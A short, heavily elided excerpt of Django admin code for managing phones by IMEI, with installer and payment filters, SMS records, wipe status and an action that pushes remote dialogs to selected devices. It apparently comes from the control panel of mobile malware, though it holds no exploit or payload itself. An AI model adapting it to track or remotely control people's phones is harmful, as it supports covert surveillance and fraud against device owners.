...
from .models import SysUser, Installer, PhoneData, RemoteDialog, LogRecord, SMSRecord, operator_code_to_full_name, \
    AppDialog
...
class PhoneDataAdmin(admin.ModelAdmin):
    list_per_page = 20
    list_display = ['imei', 'uniq_id', 'work_time', 'last_connect', 'has_card', 'wiped', 'number', 'country', ]
    list_editable = ['number', 'country', ]
    list_filter = (
        'id_sent', 'inactive', 'installer', 'paid', 'wiped',
        ...
        if 'apply' in request.POST:
            ...
            if form.is_valid():
                ...
                for p in queryset:
                    ...
                    logger.debug(u"Pushed dialog {0} to phone {1}".format(dlg, p))
                    count += 1
                plural = ''
                if count != 1:
                    plural = 's'
